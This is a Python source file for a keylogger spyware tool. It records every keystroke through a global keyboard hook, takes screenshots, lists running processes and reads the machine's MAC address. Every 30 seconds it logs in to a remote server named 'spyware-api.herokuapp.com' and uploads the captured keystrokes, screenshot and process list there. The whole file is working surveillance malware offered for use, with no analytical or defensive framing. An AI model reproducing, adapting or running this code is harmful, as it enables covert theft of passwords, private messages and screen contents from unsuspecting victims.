import keyboard                             # For Keylogger
from threading import Timer                 # For Keylogger
from getmac import get_mac_address as gma   # For Mac Address
import pyscreenshot as ImageGrab            # For ScreenLogger
import base64                               # For ScreenLogger
import requests                             # For API
import json                                 # For API
import io                                   # For ScreenLogger
import psutil as ps                         # For process
import time                                 # For API
import credenciais as cr

SEND_REPORT_EVERY = 30

def getProcess(self):
    infoSet = set()
    for proc in ps.process_iter():
        info = proc.as_dict(attrs=['pid', 'name'])
        infoSet.add(info['name'])
    process = ''
    for t in infoSet:
        process = process + t + ','
    return process

def getImage(self):
    buffer = io.BytesIO()
    image = ImageGrab.grab()
    image.save(buffer, format='png')
    image.close()
    b64_str = base64.b64encode(buffer.getvalue())

    return str(b64_str)

def doLogin(self):
    dataUser = json.dumps({"login": cr.login, "password": cr.password})
    token = requests.post("https://spyware-api.herokuapp.com/login", dataUser).text
    return {
        'Authorization': 'Bearer ' + token,
        'Content-type': 'application/json'
    }

def sendAlert(self):
    headers = doLogin(self)

    try:
        dataImage = json.dumps({"id": 0, "productImg": self.log, "base64Img": getImage(self)}, sort_keys=True, indent=4)
        image = requests.post("https://spyware-api.herokuapp.com/imagem/save", dataImage,
                              headers=headers)
        imageJson = json.loads(image.content)

        dataAlert = json.dumps({"id": 0, "pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess(self)}, sort_keys=True, indent=4)
        alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)

        print(alert.text)
        print("Alert Saved")
        time.sleep(10)
    except Exception:
        print("Error to send Alert")
        pass

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            sendAlert(self)

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
